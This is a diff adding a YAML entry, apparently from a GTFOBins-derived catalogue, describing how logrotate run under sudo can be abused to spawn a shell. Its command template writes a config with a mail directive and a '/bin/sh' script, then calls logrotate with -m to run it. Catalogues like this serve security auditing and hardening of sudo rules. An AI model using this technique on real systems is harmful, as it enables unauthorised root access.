@@ -1,0 +1,30 @@
+id: gtfobins/logrotate/shell/sudo
+type: binary
+platform: linux
+name: logrotate
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo -e ''/path/to/temp-file.config {\nmail x@x.x\n}'' >/path/to/temp-file.config
+
+    echo ''/bin/sh 0<&2 1>&2'' >/path/to/temp-file.sh
+
+    logrotate -m /path/to/temp-file.sh -f /path/to/temp-file'
+  comment: This command is picky about file permissions. An existing config file can be used as weel,
+    provided that it contains a mail directive.
+references:
+- https://gtfobins.github.io/gtfobins/logrotate/
+tags:
+- linux
+- unix
+- gtfobins
